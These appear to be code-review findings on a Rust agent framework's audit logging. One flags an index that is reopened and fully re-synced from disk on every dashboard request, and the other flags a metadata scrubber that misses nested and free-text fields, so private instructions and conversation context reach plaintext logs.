failure_scenario: handle_audit_evolution_query and handle_audit_reliability_summary each call `AuditEventIndex::open(&self.home_dir)` then `sync_from_files().await` per request (handlers.rs:4527/4536 and 4603/4612; same pattern in server.rs:1764/1775). sync_from_files (query.rs:236) does `std::fs::read_to_string` on every `.jsonl` file in the events dir each time. With a dashboard polling reliability every few seconds across multiple agents, and months of daily 10MB-rotated audit files accumulating, each poll re-reads tens to hundreds of MB and reopens the DB (losing WAL/page cache warmth) — turning a cheap indexed query into an O(total-audit-history) disk scan on a hot path. A shared, long-lived Arc<AuditEventIndex> with periodic background sync is the intended design.

summary: scrub_metadata only redacts top-level `critique` and truncates top-level `reason`; nested objects and other sensitive W19-P1 fields are persisted verbatim.
failure_scenario: scrub_metadata only inspects top-level keys of the metadata object (logger.rs:291-309). A GVU or durability emit that nests the critique (e.g. `{"gvu":{"critique":"<SOUL.md private instruction>"}}`) bypasses redaction entirely, and W19-P1 fields documented to carry free text — `last_error` (durability_retry_exhausted), `violation_detail`/`justification` (governance) — are never scrubbed at all, so user-conversation context and SOUL.md fragments leak into the plaintext JSONL audit log and the SQLite index that any dashboard reader can query.
